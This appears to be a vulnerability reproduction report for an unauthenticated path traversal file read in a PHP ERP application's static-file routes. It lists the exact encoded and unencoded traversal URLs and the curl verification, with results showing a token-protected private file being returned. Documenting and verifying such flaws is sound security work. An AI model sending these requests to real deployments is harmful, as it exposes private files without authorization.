summary: The reproduction clones the pinned vulnerable commit, installs pinned Composer dependencies, starts the PHP application, and verifies unauthenticated file reads through both vulnerable static-file routes.
expected_security_impact: Running the reproduction should return `EVOHUNT_PRIVATE_FILE` from a token-protected `MyFiles` path and should also read the repository `README.md` from outside `/MyFiles/Public/`.
actual_observed_result: Running `./reproduction/run.sh` cloned commit `73ff3c7810a1123dff1655cf31927dd6a428eb2a`, built the reproduction image, and returned `200 OK` for `/MyFiles/Public/%2e%2e/secret.txt`, `/Core/Assets/../../MyFiles/secret.txt`, and `/MyFiles/Public/%2e%2e/%2e%2e/README.md`. The first two responses contained the exact marker `EVOHUNT_PRIVATE_FILE`, and the third contained the expected README text `Open Source ERP & Accounting Software`.
verification_method: The verifier uses `curl --path-as-is` to request `/MyFiles/Public/%2e%2e/secret.txt`, `/Core/Assets/../../MyFiles/secret.txt`, and `/MyFiles/Public/%2e%2e/%2e%2e/README.md`, then checks for the exact `EVOHUNT_PRIVATE_FILE` marker and a known README string.
evidence_produced_by_run: The Myfiles route returned `200 OK` and the body `EVOHUNT_PRIVATE_FILE` without a `myft` token.
The Files route returned `200 OK` and the body `EVOHUNT_PRIVATE_FILE` for `/Core/Assets/../../MyFiles/secret.txt`.
The escaped Myfiles route returned `200 OK` and the repository README marker `Open Source ERP & Accounting Software`.

reproduction.source_acquisition: run.sh clones the target repository on the host, checks out the pinned vulnerable commit, and mounts that checkout into the container at /target-repo.
